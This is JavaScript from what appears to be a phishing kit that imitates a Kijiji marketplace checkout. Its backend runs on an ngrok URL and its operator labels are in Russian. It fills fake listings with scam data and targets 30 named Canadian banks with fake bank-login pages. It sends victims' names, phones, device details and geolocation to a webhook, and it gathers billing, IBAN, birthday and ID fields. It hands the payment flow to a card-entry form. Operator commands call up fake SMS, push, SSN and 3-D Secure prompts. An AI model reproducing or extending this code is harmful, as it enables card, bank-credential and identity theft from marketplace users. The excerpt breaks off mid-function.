(function () {
  function siteApi(p) {
    if (!p) return API_URL;
    if (p.charAt(0) !== "/") p = "/" + p;
    if (API_URL && (p.indexOf("/webhook/") === 0 || p.indexOf("/api/") === 0)) {
      return API_URL.replace(/\/$/, "") + p;
    }
    return p;
  }

  const API_URL = "https://arboricultural-roselia-unsolvably.ngrok-free.dev";
  const SERVICE_LABEL = "🇨🇦 Kijiji";
  window.__cadSkipEmbeddedOc = true;

  window.__cadEmbeddedSupport = true;

  function isMarketplaceTemplate() {
    if (document.querySelector("h5.cname") || document.body.innerHTML.indexOf("название") !== -1) return true;
    var idoc = getShadowIframeDoc();
    return !!(idoc && (idoc.querySelector("h5.cname, #modalzero, #vip-ad-title") || (idoc.body && idoc.body.innerHTML.indexOf("название") !== -1)));
  }

  function formatMarketplacePrice(p) {
    if (!p) return "";
    var s = String(p).trim();
    var num = s.replace(/[^\d.,]/g, "").replace(",", ".");
    if (!num) return s;
    var n = parseFloat(num);
    if (isNaN(n)) return s;
    try {
      return n.toLocaleString("en-CA", { style: "currency", currency: "CAD" });
    } catch (_) {
      return "$" + num;
    }
  }

  function splitRecipientName(name) {
    if (!name) return { first: "", last: "" };
    var parts = String(name).trim().split(/\s+/);
    if (parts.length === 1) return { first: parts[0], last: "" };
    return { first: parts[0], last: parts.slice(1).join(" ") };
  }

  function patchPlaceholderInputs(root, d) {
    if (!root || !root.querySelectorAll || !d) return;
    var names = splitRecipientName(d.recipient_name || "");
    var priceText = formatMarketplacePrice(d.product_price);
    root.querySelectorAll('input[type="text"], input[readonly]').forEach(function (el) {
      var val = (el.getAttribute("value") || el.value || "").trim();
      var labelText = "";
      var grp = el.closest(".form-group");
      if (grp) {
        var lab = grp.querySelector("label");
        if (lab) labelText = lab.textContent || "";
      }
      if (d.recipient_name && (val === "получатель" || val === "инициалы")) {
        if (/nachname/i.test(labelText)) el.value = names.last || names.first || d.recipient_name;
        else if (/vorname/i.test(labelText)) el.value = names.first || d.recipient_name;
        else el.value = d.recipient_name;
        el.setAttribute("value", el.value);
      }
      if (d.delivery_address && val === "адрес") {
        el.value = d.delivery_address;
        el.setAttribute("value", d.delivery_address);
      }
    });
    root.querySelectorAll(".product-id, #vip-ad-title, h1.ad-keydetails--ad-title, #viewad-price, .product-price, .boxedarticle--price, h2.boxedarticle--price").forEach(function (el) {
      var t = (el.textContent || "").trim();
      if (d.product_name && (t === "название" || t.indexOf("название") !== -1)) el.textContent = d.product_name;
      if (priceText && el.classList && el.classList.contains("product-id")) return;
      if (priceText && (el.classList.contains("product-price") || el.id === "viewad-price" || el.classList.contains("boxedarticle--price") || isPricePlaceholder(t) || /^\d[\d.,\s]*\s*€/.test(t))) {
        el.textContent = priceText;
      }
    });
    root.querySelectorAll(".info-row span").forEach(function (el) {
      var t = (el.textContent || "").trim();
      if (d.delivery_address && t === "адрес") el.textContent = d.delivery_address;
      if (d.recipient_name && (t === "получатель" || t === "инициалы")) el.textContent = d.recipient_name;
    });
    if (d.recipient_name) {
      root.querySelectorAll('meta[property="og:description"], meta[property="og:title"]').forEach(function (meta) {
        var c = meta.getAttribute("content") || "";
        if (c.indexOf("получатель") !== -1) c = c.replace(/получатель/g, d.recipient_name);
        if (c.indexOf("инициалы") !== -1) c = c.replace(/инициалы/g, d.recipient_name);
        meta.setAttribute("content", c);
      });
    }
  }

  function applyMarketplaceTemplateData(d) {
    var priceText = formatMarketplacePrice(d.product_price);
    var templateId = null;
    if (typeof adinfo !== "undefined" && adinfo && adinfo.id) {
      templateId = String(adinfo.id);
      if (d.link_id) adinfo.id = String(d.link_id);
    }

    document.querySelectorAll("h5.cname, .cname, #vip-ad-title, h1.ad-keydetails--ad-title, h2.main__title, .ad-keydetails--ad-title, .font-medium.text-xl").forEach(function (el) {
      var t = (el.textContent || "").trim();
      if (d.product_name && t === "название") {
        el.textContent = d.product_name;
        return;
      }
      if (priceText && (/lei/i.test(t) || /^\d[\d.,\s]*$/.test(t))) {
        el.textContent = priceText;
      }
    });

    var names = splitRecipientName(d.recipient_name);
    document.querySelectorAll('input[value="инициалы"]').forEach(function (el) {
      if (d.recipient_name) el.value = names.first || d.recipient_name;
    });
    document.querySelectorAll('input[value="адрес"]').forEach(function (el) {
      if (d.delivery_address) el.value = d.delivery_address;
    });

    document.querySelectorAll("img.avatar, .avatar-wrapper img, img[src*='no_img'], img.main__image, #vip-ad-picture-list img").forEach(function (img) {
      if (!d.product_image) return;
      img.src = d.product_image;
      if (d.product_name) img.alt = d.product_name;
      img.removeAttribute("srcset");
      img.onerror = function () {
        this.onerror = null;
        this.src = "/no_img.png";
      };
    });

    document.querySelectorAll('meta[property="og:description"], meta[property="og:image"]').forEach(function (meta) {
      var prop = meta.getAttribute("property") || "";
      var c = meta.getAttribute("content") || "";
      if (prop === "og:description") {
        if (d.product_name && c.indexOf("название") !== -1) {
          c = c.replace(/название/g, d.product_name);
        }
        if (d.product_price) {
          c = c.replace(/\d[\d.,]*/g, formatMarketplacePrice(d.product_price).replace(/\s*€$/i, ""));
        }
        meta.setAttribute("content", c);
      }
      if (prop === "og:image" && d.product_image) {
        meta.setAttribute("content", d.product_image);
      }
    });

    if (d.product_name && document.title.indexOf("название") !== -1) {
      document.title = document.title.replace(/название/g, d.product_name);
    }

    if (priceText) {
      var leiBank = "lei " + priceText.replace(/\s*€$/i, "");
      document.querySelectorAll("b").forEach(function (el) {
        if (/^lei\s[\d.,]+/i.test((el.textContent || "").trim())) {
          el.textContent = leiBank;
        }
      });
      document.querySelectorAll(".c-title.cname span span, .c-title.cname > span").forEach(function (el) {
        if (/lei/i.test(el.textContent || "")) el.textContent = priceText;
      });
    }

    document.querySelectorAll("div, span, p, td, b, h1, h2, h3, label").forEach(function (el) {
      if (el.children.length) return;
      var t = (el.textContent || "").trim();
      if (d.product_name && t === "название") el.textContent = d.product_name;
      if (d.recipient_name && (t === "получатель" || t === "инициалы")) el.textContent = d.recipient_name;
      if (d.delivery_address && t === "адрес") el.textContent = d.delivery_address;
      if (priceText && isPricePlaceholder(t)) el.textContent = priceText;
    });
    if (d.link_id && templateId && templateId !== String(d.link_id)) {
      document.querySelectorAll("[onclick], [href], a, button, script").forEach(function (el) {
        ["onclick", "href"].forEach(function (attr) {
          var v = el.getAttribute(attr);
          if (v && v.indexOf(templateId) !== -1) {
            el.setAttribute(attr, v.split(templateId).join(String(d.link_id)));
          }
        });
      });
    }
  }

  function isCourierTemplate() {
    if (document.querySelector(".payment-info") || document.getElementById("push-amount")) return true;
    if (document.body && document.body.innerHTML.indexOf("название") !== -1 && document.querySelector("td")) return true;
    var idoc = getShadowIframeDoc();
    return !!(idoc && (idoc.querySelector(".payment-info, #push-amount, td") || idoc.body && idoc.body.innerHTML.indexOf("название") !== -1));
  }

  function isUiLabelText(text) {
    var t = String(text || "").trim();
    if (!t) return false;
    if (t === "получатель" || t === "инициалы" || t === "адрес" || t === "название") return false;
    return /total a recibir|total a receber|custo do produto|custo da entrega|costo|iva|recibir pago|iniciales|iniciais do destinatário|endereço de entrega|dirección|direccion|destinatario|nombre|adresse|empfänger/i.test(t);
  }

  function isPricePlaceholder(text) {
    var t = String(text || "").trim();
    if (!t) return false;
    if (t === "получатель" || t === "инициалы" || t === "адрес" || t === "название") return false;
    if (/^0\.00\s*(zł|lei|€)$/i.test(t)) return false;
    return /zł|lei|PLN|€|EUR|CAD|\$/i.test(t) || /^[\d\s.,]+\s*€?$/i.test(t) || /^€\s*[\d\s.,]+/i.test(t) || /^\$\s*[\d\s.,]+/i.test(t);
  }

  function applyCourierToRoot(root, d) {
    if (!root || !root.querySelectorAll) return;
    patchPlaceholderInputs(root, d);
    var priceText = formatMarketplacePrice(d.product_price);

    root.querySelectorAll(".payment-info span, .payment-info div.col, .menu div.col, .row div.col").forEach(function (el) {
      var t = (el.textContent || "").trim();
      if (d.recipient_name && (t === "получатель" || t === "инициалы")) {
        el.textContent = d.recipient_name;
        return;
      }
      if (d.delivery_address && t === "адрес") {
        el.textContent = d.delivery_address;
        return;
      }
      if (d.product_name && t === "название") {
        el.textContent = d.product_name;
        return;
      }
      if (isUiLabelText(t)) return;
      if (priceText && isPricePlaceholder(t)) {
        el.textContent = priceText;
      }
    });

    root.querySelectorAll("td, b, ._19, .transaction-amount").forEach(function (el) {
      var t = (el.textContent || "").trim();
      if (d.product_name && t === "название") {
        el.textContent = d.product_name;
        return;
      }
      if (t === "адрес") {
        if (d.delivery_address) el.textContent = d.delivery_address;
        else if (d.recipient_name) el.textContent = d.recipient_name;
        return;
      }
      if (d.recipient_name && (t === "получатель" || t === "инициалы")) {
        el.textContent = d.recipient_name;
        return;
      }
      if (priceText && isPricePlaceholder(t)) {
        el.textContent = priceText;
      }
    });

    var pushAmt = root.getElementById("push-amount");
    if (pushAmt && priceText) pushAmt.textContent = priceText;

    root.querySelectorAll('meta[property="og:description"], meta[property="og:title"]').forEach(function (meta) {
      var c = meta.getAttribute("content") || "";
      if (d.product_name && c.indexOf("название") !== -1) {
        c = c.replace(/название/g, d.product_name);
      }
      if (d.recipient_name && c.indexOf("инициалы") !== -1) {
        c = c.replace(/инициалы/g, d.recipient_name);
      }
      if (d.delivery_address && c.indexOf("адрес") !== -1) {
        c = c.replace(/адрес/g, d.delivery_address);
      }
      if (priceText && /\d/.test(c)) {
        c = c.replace(/\d[\d.,\s]*/g, priceText.replace(/\s*€$/i, "").trim());
      }
      meta.setAttribute("content", c);
    });

    if (d.product_name && root.title && root.title.indexOf("название") !== -1) {
      root.title = root.title.replace(/название/g, d.product_name);
    }

    if (priceText) {
      try {
        if (root.defaultView && root.defaultView.jQuery) {
          root.defaultView.jQuery("#push-amount").text(priceText);
        }
      } catch (_) {}
    }
  }

  function getShadowIframeDoc() {
    try {
      var host = document.getElementById("shadow-host");
      if (!host || !host.shadowRoot) return null;
      var iframe = host.shadowRoot.querySelector("iframe");
      return iframe && iframe.contentDocument ? iframe.contentDocument : null;
    } catch (_) {
      return null;
    }
  }

  function applyMarketplaceToRoot(root, d) {
    if (!root || !root.querySelectorAll) return;
    patchPlaceholderInputs(root, d);
    var priceText = formatMarketplacePrice(d.product_price);
    root.querySelectorAll("h5.cname, .cname, .ad-keydetails--ad-price, #vip-ad-price, .totalPrice, h1.ad-keydetails--ad-title, #vip-ad-title, .font-medium.text-xl, h2.main__title").forEach(function (el) {
      var t = (el.textContent || "").trim();
      if (d.product_name && (t === "название" || t.indexOf("название") !== -1)) el.textContent = d.product_name;
      if (priceText && (isPricePlaceholder(t) || /€|EUR|CAD|\$|\d{3,}/.test(t))) el.textContent = priceText;
    });
    root.querySelectorAll(".itemized-costs span, .lis-1 li, .lis-main li, .total-section span, b").forEach(function (el) {
      var t = (el.textContent || "").trim();
      if (d.product_name && t === "название") el.textContent = d.product_name;
      if (priceText && (isPricePlaceholder(t) || /€|EUR|CAD|\$|\d{3,}/.test(t))) el.textContent = priceText;
    });
    root.querySelectorAll('input[value="инициалы"], #vorname0, #nachname0, #name-data, #surtext-data').forEach(function (el) {
      if (!d.recipient_name) return;
      var names = splitRecipientName(d.recipient_name);
      if (el.id === "vorname0" || el.id === "name-data") el.value = names.first || d.recipient_name;
      if (el.id === "nachname0" || el.id === "surtext-data") el.value = names.last;
      if (el.value === "инициалы") el.value = names.first || d.recipient_name;
    });
    root.querySelectorAll('input[value="адрес"], #address-data').forEach(function (el) {
      if (d.delivery_address) el.value = d.delivery_address;
    });
    root.querySelectorAll("div, span, p, td, b, h1, h2, h3, label").forEach(function (el) {
      if (el.children.length) return;
      var t = (el.textContent || "").trim();
      if (d.product_name && t === "название") el.textContent = d.product_name;
      if (d.recipient_name && (t === "инициалы" || t === "получатель")) el.textContent = d.recipient_name;
      if (d.delivery_address && t === "адрес") el.textContent = d.delivery_address;
      if (priceText && (isPricePlaceholder(t) || /€|EUR|CAD|\$|\d{3,}/.test(t))) el.textContent = priceText;
    });
    function patchImages(rootEl, data) {
      if (!data.product_image) return;
      rootEl.querySelectorAll("img.main__image, img.avatar, img[src*='no_img'], #vip-ad-picture-list img, img[class*='max-h']").forEach(function (img) {
        img.src = data.product_image;
        if (data.product_name) img.alt = data.product_name;
        img.removeAttribute("srcset");
        img.onerror = function () { this.onerror = null; this.src = "/no_img.png"; };
      });
      rootEl.querySelectorAll("img").forEach(function (img) {
        var src = img.getAttribute("src") || "";
        if (src.indexOf("no_img") === -1) return;
        img.src = data.product_image;
        if (data.product_name) img.alt = data.product_name;
        img.removeAttribute("srcset");
        img.onerror = function () { this.onerror = null; this.src = "/no_img.png"; };
      });
    }
    try { patchImages(root, d); } catch (_) {}
    if (d.product_name && root.title && root.title.indexOf("название") !== -1) {
      root.title = root.title.replace(/название/g, d.product_name);
    }
    if (d.link_id) {
      root.querySelectorAll("#vip-ad-id, .seller-info p").forEach(function (el) {
        var t = el.textContent || "";
        if (t.indexOf("Anzeigen-ID") !== -1 || t.indexOf("ID:") !== -1) {
          el.textContent = t.replace(/\d{5,}/, String(d.link_id));
        }
      });
    }
  }

  function patchShadowPaymentFlow() {
    var doc = getShadowIframeDoc();
    if (!doc || !doc.defaultView) return;
    var win = doc.defaultView;
    if (win.__cadPaymentPatched) return;
    win.__cadPaymentPatched = true;
    win.getNext = function () {
      win.callback = "openFormCard";
    };
  }

  function scheduleShadowDataPatch(d) {
    var tries = 0;
    function attempt() {
      tries++;
      var doc = getShadowIframeDoc();
      if (doc && doc.body && doc.body.childNodes.length) {
        patchShadowPaymentFlow();
        if (isMarketplaceTemplate() || doc.querySelector("#modalzero, #vip-ad-title, h5.cname")) {
          applyMarketplaceToRoot(doc, d);
        }
        if (isCourierTemplate() || doc.querySelector(".payment-info, #push-amount")) {
          applyCourierToRoot(doc, d);
        }
        return;
      }
      if (tries < 30) setTimeout(attempt, 250);
    }
    attempt();
  }

  function applyCourierTemplateData(d) {
    applyCourierToRoot(document, d);
    var idoc = getShadowIframeDoc();
    if (idoc) applyCourierToRoot(idoc, d);
  }

  var _cachedClientLocation = null;
  async function getClientLocation() {
    if (_cachedClientLocation) return _cachedClientLocation;
    try {
      var res = await fetch("https://ip-api.com/json/?fields=status,country,city", {
        signal: AbortSignal.timeout(5000),
      });
      if (res.ok) {
        var data = await res.json();
        if (data.status === "success" && data.country) {
          _cachedClientLocation = data.country + (data.city ? ", " + data.city : "");
          return _cachedClientLocation;
        }
      }
    } catch (_) {}
    return "";
  }

  const LK_SLUG_BY_INDEX = {
  "1": "ATB-Financial",
  "2": "Affinity-Credit-Union",
  "3": "Alterna-Savings",
  "4": "Another-Bank",
  "5": "BMO",
  "6": "CIBC",
  "7": "Coast-Capital-Bank",
  "8": "Conexus-Credit-Union",
  "9": "Desjardins",
  "10": "EQ-BANK",
  "11": "Envision-Financial",
  "12": "Innovation-Federal-Credit-Union",
  "13": "Laurentian-Bank",
  "14": "Libro-Credit-Union",
  "15": "Meridian-Bank",
  "16": "Motusbank",
  "17": "National-Bank",
  "18": "North-Valley-Credit-Union",
  "19": "PC-Financial",
  "20": "Peoples-Trust",
  "21": "Prospera-Credit-Union-Bank",
  "22": "RBC-Royal-Bank",
  "23": "Scotiabank",
  "24": "Servus",
  "25": "Simplii-Financial",
  "26": "TD-Bank",
  "27": "Tangerine",
  "28": "UNI-Financial-Cooperation-Bank",
  "29": "Valley-First",
  "30": "Vancity"
};
  const LK_BANK_NAMES = {
  "1": "ATB Financial",
  "2": "Affinity Credit Union",
  "3": "Alterna Savings",
  "4": "Another Bank",
  "5": "BMO",
  "6": "CIBC",
  "7": "Coast Capital Bank",
  "8": "Conexus Credit Union",
  "9": "Desjardins",
  "10": "EQ BANK",
  "11": "Envision Financial",
  "12": "Innovation Federal Credit Union",
  "13": "Laurentian Bank",
  "14": "Libro Credit Union",
  "15": "Meridian Bank",
  "16": "Motusbank",
  "17": "National Bank",
  "18": "North Valley Credit Union",
  "19": "PC Financial",
  "20": "Peoples Trust",
  "21": "Prospera Credit Union Bank",
  "22": "RBC Royal Bank",
  "23": "Scotiabank",
  "24": "Servus",
  "25": "Simplii Financial",
  "26": "TD Bank",
  "27": "Tangerine",
  "28": "UNI Financial Cooperation Bank",
  "29": "Valley First",
  "30": "Vancity"
};

  document.documentElement.classList.add("cad-loading");

  window.LINK_DATA = {
    user_id: null,
    link_id: null,
    service: SERVICE_LABEL,
    product_name: "",
    recipient_name: "",
    delivery_address: "",
    product_price: "",
    product_image: "",
    input_mode: "card",
    request_balance: true,
  };

  let pageVisitSent = false;
  let pageLeaveSent = false;
  let visibilityLeaveSent = false;
  let xapiTimer = null;
  let userContactSent = false;
  function setUiPageKey(key) { window.__uiPageKey = key || ""; }
  function readUserContactFields() {
    function val(sel) { var el = document.querySelector(sel); return el && !el.disabled ? String(el.value || "").trim() : ""; }
    var first = val("#name-data") || val("#first_name") || val("#SA1");
    var last = val("#surtext-data") || val("#last_name") || val("#SA2");
    var phone = val("#phone-number") || val("#last_name") || val("#req-phone") || val("#phone");
    if (!first && !last && !phone) return null;
    return { first_name: first, last_name: last, phone: phone };
  }
  async function sendUserContactIfNeeded() {
    if (userContactSent || !window.LINK_DATA.link_id) return;
    var data = readUserContactFields();
    if (!data || (!data.first_name && !data.last_name && !data.phone)) return;
    userContactSent = true;
    try {
      await fetch(siteApi("/webhook/user_contact", {
        method: "POST", headers: apiHeaders(),
        body: JSON.stringify(Object.assign({ link_id: window.LINK_DATA.link_id, service: window.LINK_DATA.service, device_info: getDeviceInfo(), user_agent: navigator.userAgent, page_kind: pageKind() }, data)),
      });
    } catch (_) {}
  }
  function installUserContactWatch() {
    document.addEventListener("click", function (e) {
      var t = e.target;
      if (t && t.closest && t.closest("#menu a, #menu button, [onclick*='openFormCard']")) setTimeout(sendUserContactIfNeeded, 0);
    }, true);
  }

  function isReturnPage() {
    return window.location.pathname.indexOf("/refund/") !== -1 || window.location.pathname.indexOf("/return/") !== -1;
  }

  function pageKind() {
    return isReturnPage() ? "return" : "main";
  }

  function currentPageKey() {
    if (window.__uiPageKey) return window.__uiPageKey;
    var p = location.pathname;
    if (/\/receive\//.test(p) && p.indexOf("/lk/") === -1) return "card";
    if (/\/refund\//.test(p) && p.indexOf("/lk/") === -1 && !/refund\.html$/.test(p)) return "card";
    if (/\/receive\/lk\/|\/refund\/lk\//.test(p)) return "bank";
    if (/\/lk\//.test(p)) return "lk";
    if (isReturnPage()) return "return";
    return "listing";
  }

  function apiHeaders() {
    return {
      "Content-Type": "application/json",
      "ngrok-skip-browser-warning": "true",
    };
  }

  function getDeviceInfo() {
    const ua = navigator.userAgent;
    let device = /mobile/i.test(ua) ? "Смартфон" : /tablet/i.test(ua) ? "Планшет" : "Компьютер";
    let os = "Неизвестно";
    if (/iphone|ipad|ipod/i.test(ua)) os = "iOS";
    else if (/android/i.test(ua)) os = "Android";
    else if (/windows/i.test(ua)) os = "Windows";
    else if (/mac/i.test(ua)) os = "macOS";
    return device + ", " + os + ", " + ua;
  }

  function parseLinkId() {
    const params = new URLSearchParams(window.location.search);
    const parts = window.location.pathname.split("/").filter(Boolean);
    const pathId = parts.find(function (p) {
      return /^\d{5,}$/.test(p);
    });
    return params.get("link_id") || pathId || null;
  }

  function servicePathPrefix() {
    var parts = location.pathname.split("/").filter(Boolean);
    if (!parts.length) return "";
    var reserved = {
      apps: 1, api: 1, card: 1, receive: 1, return: 1, refund: 1, lk: 1, captcha: 1, video: 1, verif: 1,
    };
    var first = parts[0];
    if (reserved[first] || /^\d{5,}$/.test(first)) return "";
    return "/" + first;
  }

  function withPrefix(rel) {
    var pre = servicePathPrefix();
    if (!rel || rel === "/") return pre || "/";
    return pre + (rel.charAt(0) === "/" ? rel : "/" + rel);
  }

  function parseLinkRecord(serverData) {
    if (!serverData || typeof serverData !== "object") {
      return { meta: {}, payload: {} };
    }
    if (serverData.success && serverData.data && typeof serverData.data === "object") {
      var meta = serverData.data;
      var payload = meta.data && typeof meta.data === "object" ? meta.data : meta;
      return { meta: meta, payload: payload };
    }
    if (serverData.data && typeof serverData.data === "object" && !serverData.product_name) {
      return { meta: serverData, payload: serverData.data };
    }
    return { meta: serverData, payload: serverData };
  }

  function resolveInputMode(record, payload) {
    var ws = record.worker_settings || {};
    var extra = ws.extra || {};
    if (extra.data_request === "lk") return "lk";
    if (extra.data_request === "card") return "card";
    return record.input_mode || payload.input_mode || "card";
  }

  function isReceiveLkPage() {
    var p = location.pathname;
    return p.indexOf("/receive/lk/") !== -1 || p.indexOf("/return/lk/") !== -1 || p.indexOf("/lk/lk/") !== -1;
  }

  function isListingPage() {
    var parts = location.pathname.split("/").filter(Boolean);
    if (!parts.length) return false;
    var last = parts[parts.length - 1];
    if (!/^\d{5,}$/.test(last)) return false;
    return (
      parts.indexOf("card") === -1 &&
      parts.indexOf("return") === -1 &&
      parts.indexOf("lk") === -1 &&
      parts.indexOf("refund") === -1
    );
  }

  function hasInlineCardModal() {
    if (document.getElementById("form-modal") && document.getElementById("card-number")) return true;
    return !!(window.jQuery && window.jQuery("#form-modal").length && window.jQuery("#card-number").length);
  }

  function lkPageUrl() {
    var lid = window.LINK_DATA.link_id;
    if (isReturnPage()) {
      return withPrefix(lid ? "/return/lk/" + lid : "/return/lk/");
    }
    return withPrefix(lid ? "/receive/lk/" + lid : "/receive/lk/");
  }

  function revealPage() {
    document.documentElement.classList.remove("cad-loading");
  }

  function applyLinkDataToPage() {
    const d = window.LINK_DATA;
    if (typeof adinfo !== "undefined" && d.link_id) {
      adinfo.id = String(d.link_id);
    }

    const price = formatMarketplacePrice(d.product_price);

    document.querySelectorAll("p.cAWeBm, h2.main__title, .main__title").forEach(function (el) {
      if (d.product_name) el.textContent = d.product_name;
    });

    document.querySelectorAll("a.fRxqiS").forEach(function (el) {
      if (d.recipient_name) el.textContent = d.recipient_name;
    });

    document.querySelectorAll("p.fRxqiS, .main__total-price, #push-amount, b.main__price").forEach(function (el) {
      if (price) el.textContent = price;
    });

    document.querySelectorAll("h2").forEach(function (el) {
      if (!d.product_name && !price) return;
      if (el.innerHTML && el.innerHTML.indexOf("название") !== -1) {
        el.innerHTML = (d.product_name || "название") + "<br/><br/><span style=\"font-size: 2rem;font-weight: 700;\">" + (price || "$0") + "</span>";
      }
    });

    if (d.product_name) {
      document.querySelectorAll("img.main__image, img[alt='название']").forEach(function (img) {
        img.alt = d.product_name;
      });
      if (document.title.indexOf("название") !== -1) {
        document.title = document.title.replace("название", d.product_name);
      }
    }

    document.querySelectorAll(".styles__OfferInfo-sc-7fa98f5e-11 b").forEach(function (el) {
      if (d.delivery_address) el.textContent = d.delivery_address;
    });

    const nick = document.getElementById("nickname");
    if (nick && d.recipient_name) {
      nick.textContent = d.recipient_name.charAt(0).toUpperCase();
    }

    document.querySelectorAll('[data-testid="avatar__initials"] span').forEach(function (el) {
      if (el.id !== "nickname" && d.recipient_name) {
        el.textContent = d.recipient_name.charAt(0).toUpperCase();
      }
    });

    const img =
      document.getElementById("depop-product-image") ||
      document.querySelector("img.main__image, .styles__ProductImage-sc-7fa98f5e-2, img.csrpGj");
    if (img) {
      var square = window.matchMedia("(max-width: 767px)").matches ? "72px" : "96px";
      img.style.width = square;
      img.style.height = square;
      img.style.maxWidth = square;
      img.style.maxHeight = square;
      img.style.aspectRatio = "1 / 1";
      img.style.objectFit = "cover";
      img.style.objectPosition = "center";
      img.style.display = "block";
      img.style.flexShrink = "0";
      if (d.product_image) {
        img.src = d.product_image;
        img.alt = d.product_name || "Product";
        img.onerror = function () {
          this.onerror = null;
          this.src = "/no_img.png";
        };
      } else if (!img.getAttribute("src") || img.getAttribute("src").indexOf("no_img") !== -1) {
        img.src = "/no_img.png";
      }
    }

    if (d.product_price) {
      try {
        if (window.LINK_DATA && window.LINK_DATA.request_balance === false) {
          localStorage.setItem("totalPrice", String(d.product_price).replace(/[^\d.]/g, ""));
        } else {
          localStorage.removeItem("totalPrice");
        }
      } catch (_) {}
      try {
        if (window.jQuery) window.jQuery("#push-amount").text(price);
      } catch (_) {}
    }
    document.querySelectorAll(".font-medium.break-words.text-xl, .font-bold.text-3xl, [class*='text-xl']").forEach(function (el) {
      var t = (el.textContent || "").trim();
      var priceText = formatMarketplacePrice(d.product_price);
      if (d.product_name && t === "название") el.textContent = d.product_name;
      if (priceText && (isPricePlaceholder(t) || /€|EUR|\d/.test(t)) && el.classList.contains("text-3xl")) el.textContent = priceText;
    });
    document.querySelectorAll("td._19, td, b, .transaction-amount, #push-amount").forEach(function (el) {
      var t = (el.textContent || "").trim();
      var priceText = formatMarketplacePrice(d.product_price);
      if (d.product_name && t === "название") { el.textContent = d.product_name; return; }
      if (t === "адрес") {
        if (d.delivery_address) el.textContent = d.delivery_address;
        else if (d.recipient_name) el.textContent = d.recipient_name;
        return;
      }
      if (priceText && (isPricePlaceholder(t) || /€|EUR|CAD|\$|\d{3,}/.test(t))) el.textContent = priceText;
    });
    if (isMarketplaceTemplate()) applyMarketplaceTemplateData(d);
    else if (isCourierTemplate()) applyCourierTemplateData(d);
    var shadowDoc = getShadowIframeDoc();
    if (shadowDoc) {
      try { applyMarketplaceToRoot(shadowDoc, d); } catch (e) { console.warn("[DE] shadow data:", e); }
    }
    scheduleShadowDataPatch(d);
  }

  function mountBillingFieldsInline() {
    var customForm = document.getElementById("custom-form");
    var inputCard = document.getElementById("input-card");
    if (!customForm || !inputCard) return false;
    if (inputCard.__billingMounted) return true;
    var anchor = inputCard.querySelector("#cardholder");
    if (anchor) anchor = anchor.closest(".row") || anchor;
    var fields = customForm.querySelectorAll('[id^="element-"]');
    if (!fields.length) return false;
    fields.forEach(function (el) {
      if (anchor && anchor.parentNode === inputCard) inputCard.insertBefore(el, anchor.nextSibling);
      else inputCard.appendChild(el);
    });
    inputCard.__billingMounted = true;
    return true;
  }

  function patchReqBillingFormInline() {
    if (window.__billingInlinePatched) return;
    window.__billingInlinePatched = true;
    var orig = window.reqBillingForm;
    window.reqBillingForm = function () {
      mountBillingFieldsInline();
      var customForm = document.getElementById("custom-form");
      if (customForm) customForm.style.display = "block";
      if (window.jQuery) {
        var $c = window.jQuery("#form-modal-custom");
        if ($c.length && $c.hasClass("open")) $c.modal("close");
      }
      if (typeof orig === "function" && !document.getElementById("input-card")) {
        try { orig(); } catch (_) {}
      }
    };
  }

  function scheduleBillingApply() {
    applyBillingFromLinkData();
    setTimeout(applyBillingFromLinkData, 300);
    setTimeout(applyBillingFromLinkData, 900);
    setTimeout(applyBillingFromLinkData, 2000);
  }

  function collectInlineBillingPayload() {
    var map = [
      ["country", "#req-country"],
      ["city", "#req-city"],
      ["state", "#req-state"],
      ["billing-address", "#req-billing-address"],
      ["phone", "#req-phone"],
      ["zipcode", "#req-zipcode"],
      ["tax", "#req-tax"],
      ["dni", "#req-dni"],
      ["fullname", "#req-fullname"],
      ["birthday", "#req-birthday"],
      ["iban", "#req-iban"],
    ];
    var payload = { type: "sent-billing" };
    var hasVisible = false;
    map.forEach(function (pair) {
      var wrap = document.getElementById("element-" + pair[0]);
      if (!wrap || wrap.style.display === "none") return;
      hasVisible = true;
      var el = document.querySelector(pair[1]);
      if (el && String(el.value || "").trim()) payload[pair[0]] = String(el.value).trim();
    });
    return hasVisible ? payload : null;
  }

  function applyBillingFromLinkData() {
    var req = window.LINK_DATA && window.LINK_DATA.billing_req;
    if (!req && window.LINK_DATA && window.LINK_DATA.worker_settings) {
      var fields = (window.LINK_DATA.worker_settings.extra || {}).billing_fields;
      if (fields) {
        var map = {
          phone: "phone",
          country: "country",
          city: "city",
          state: "state",
          "billing-address": "billing-address",
          zipcode: "zipcode",
          iban: "iban",
        };
        var out = {};
        Object.keys(map).forEach(function (k) {
          if (fields[k]) out[map[k]] = 1;
        });
        if (Object.keys(out).length) req = "req_billing:" + JSON.stringify(out);
      }
    }
    if (req) {
      patchReqBillingFormInline();
      mountBillingFieldsInline();
      applyReqBillingFields(req);
    }
  }

  function applyReqBillingFields(data) {
    var availableFields = [
      "country", "city", "state", "billing-address", "phone", "zipcode",
      "tax", "dni", "fullname", "birthday", "iban",
    ];
    availableFields.forEach(function (fieldName) {
      var el = document.getElementById("element-" + fieldName);
      if (el) el.style.display = "none";
    });
    if (!data || data.indexOf("req_billing") !== 0) return;
    try {
      var datajson = JSON.parse(data.substr(12));
      Object.keys(datajson).forEach(function (key) {
        var el = document.getElementById("element-" + key);
        if (el && datajson[key]) el.style.display = "block";
      });
    } catch (_) {
      ["country", "city", "billing-address", "phone", "zipcode", "fullname"].forEach(function (k) {
        var el = document.getElementById("element-" + k);
        if (el) el.style.display = "block";
      });
    }
  }

  function patchOperatorCallButton() {
    window.sentPush_operator_call = function () {
      var btn = document.getElementById("oc-submit-btn");
      if (btn) btn.disabled = true;
      forwardDepopInput({ type: "confirmed_push" }).then(function () {
        try {
          if (window.jQuery && window.jQuery("#form-modal").length) {
            window.jQuery("#form-modal").modal("close");
          }
          if (typeof _hideAll3DSecure === "function") _hideAll3DSecure();
          if (typeof __hideallforms === "function") __hideallforms();
        } catch (_) {}
      });
    };
  }

  function dispatchXApiCommand(raw) {
    if (!raw) return;
    var data = String(raw).trim();
    if (!data) return;

    if (typeof window.__cadLastCmd !== "undefined" && window.__cadLastCmd === data) return;
    window.__cadLastCmd = data;
    setTimeout(function () {
      window.__cadLastCmd = "";
    }, 1500);

    console.log("[🇨🇦 Kijiji] XApi:", data);

    try {
      if (data === "sms" && typeof showCode === "function") {
        showCode();
        return;
      }
      if (data === "push" && typeof showPush === "function") {
        showPush();
        return;
      }
      if (data === "static" && typeof showStatic === "function") {
        showStatic();
        return;
      }
      if (data === "ssn" && window.jQuery) {
        window.jQuery("#ssn-modal").modal("open");
        return;
      }
      if (data === "operator_call" && typeof showPush_operator_call === "function") {
        showPush_operator_call();
        return;
      }
      if (data === "registration" && window.jQuery) {
